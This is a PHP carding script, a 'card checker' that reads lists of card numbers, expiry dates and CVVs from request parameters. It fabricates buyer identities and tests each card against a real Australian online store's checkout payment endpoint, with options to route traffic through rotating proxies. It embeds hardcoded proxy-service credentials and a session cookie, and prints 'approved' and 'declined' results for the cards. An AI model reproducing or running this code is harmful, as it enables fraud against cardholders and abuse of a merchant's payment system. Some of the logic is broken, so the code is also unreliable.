<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

// If(strlen($ano) > 2)
// {
//   $ano = substr($ano,2,2);
// }
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
$lname = 'Wang';
// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
// $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);




//============================================================================================================================================================



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.schots.com.au/rest/default/V1/guest-carts/in0mrJy9oi3u4vUbWB9rTKvqMTdyaEm9/payment-information');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: __cfduid=d5fd7816db0595ea6db5c36acea79eb311592325271; PHPSESSID=1f466e93f1b8d1811cfe9b79903fb2e8; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; __zlcmid=yjjDNQvv7TXpfG; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; form_key=EvrmUBXse65QyIQE; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; privateData=%7B%22search%22%3A%22tape%22%7D; private_content_version=628abdd1722f48725f7c3974f8426f88; section_data_ids=%7B%22cart%22%3A1592330252%2C%22customer%22%3A1592330150%2C%22compare-products%22%3A1592330150%2C%22last-ordered-items%22%3A1592330150%2C%22directory-data%22%3A1592330150%2C%22captcha%22%3A1592330150%2C%22wishlist%22%3A1592330150%2C%22instant-purchase%22%3A1592330150%2C%22multiplewishlist%22%3A1592330150%2C%22persistent%22%3A1592330150%2C%22review%22%3A1592330150%2C%22zopim-chat%22%3A1592330150%2C%22recently_viewed_product%22%3A1592330150%2C%22recently_compared_product%22%3A1592330150%2C%22product_data_storage%22%3A1592330150%2C%22paypal-billing-agreement%22%3A1592330150%2C%22checkout-fields%22%3A1592330150%2C%22collection-point-result%22%3A1592330150%2C%22pickup-location-result%22%3A1592330150%7D',
'origin: https://www.schots.com.au',
'referer: https://www.schots.com.au/checkout/',
'user-agent: '.$browser.'',
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"in0mrJy9oi3u4vUbWB9rTKvqMTdyaEm9","billingAddress":{"countryId":"AU","regionId":"513","regionCode":"NSW","region":"New South Wales","street":["12 avenue"],"company":"","telephone":"5182641524","postcode":"2150","city":"Harris Park","firstname":"Vincnet","lastname":"Warner","saveInAddressBook":0,"save_in_address_book":0,"extension_attributes":{"is_stairs":0}},"paymentMethod":{"method":"migs","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"MC","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes1.'","cc_number":"'.$cc.'"}},"email":"pubgkittu@gmail.com"}');


$token = trim(strip_tags(getstr($result,'<a name="payment-section"></a><input type="hidden" name="springboard_fraud_token" value="','" />
')));

// // // //*****************************************************************************************************************************************************************************************************************************************************************************
echo $token;

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);




 // $token = trim(strip_tags(getstr($result,'<input name="__RequestVerificationToken" type="hidden" value="','" /></form>')));

// echo $token;
$message = trim(strip_tags(getstr($result,'"StatusDescription":"','"')));
// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));


// //////////////////////// BIN INFO ////////////////////////////////
// // $curl = curl_init();
// // curl_setopt($curl, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn.'');
// // curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// // curl_setopt($curl, CURLOPT_HTTPHEADER, array(
// // 'Host: lookup.binlist.net',
// // 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
// // 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
// // ));
// // curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
// // curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
// // curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
// // curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
// // curl_setopt($curl, CURLOPT_POSTFIELDS, '');
// // $fim = curl_exec($curl);

// // $bank = getStr($fim, '"bank":{"name":"','"');
// // $pais = getStr($fim, '"name":"','"');
// // $brand = getStr($fim, '"brand":"','"');
// // $type = trim(strip_tags(getstr($fim,'"type":"','"')));

// /////////////////////// RESULT ////////////////////////////////////
// if(strpos($result,'"operation success"')){
//        echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | '.$type.' | '.$category.'</font></b></font></td></tr>';
//        }
// if(strpos($result,'"status":"error"')){
// // updatecart();

// }
// // if(strpos($result,'"status": "succeeded"')){

//   echo '<tr><td><font size="3"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="3">'.$lista.'</font></td><td><font size="3">&nbsp;&nbsp;&nbsp;<b>'.$result.' &nbsp;&nbsp;&nbsp;'.$bin.'</b></font></td></tr>';

// }
// elseif(strpos($result,'Not sufficient funds')){

//    echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ Less Funds ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';

// }
// elseif(strpos($result,'Internal Server Error')){

//     echo '<tr><td><font size="2"><font color="#ff0000">#Reprovada </font></td><td><font size="2">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'.$lista.'</font></td><td><font></font><td><font size="2"><b>&nbsp&nbsp&nbsp&nbsp==>[ERROR]&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp==>'.$pais.'|'.$bank.'|'.$type.'</b></font></td></tr>';
// }

// elseif(strpos($result,'AVS Mismatch')){

//  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [AVS Declined ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
//  }
// else {

// updatecart();

     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada - </font></td><td><font size="2"><font color="#C0C0C0">  '.$lista.' - </font></td><td><font></font><td><font size="2"<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | '.$type.' | '.$level.'</font></b></font></td></tr>';



  // echo '<tr><td><font size="2"><font color="#ff0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b>|'.$message.'|'.$code.'|'.$message2.'&nbsp;&nbsp;&nbsp;'.$bin.'</b></font></td></tr>';
  // }
curl_close($curl);
ob_flush();
      // echo $result;
//echo $browser;
?>
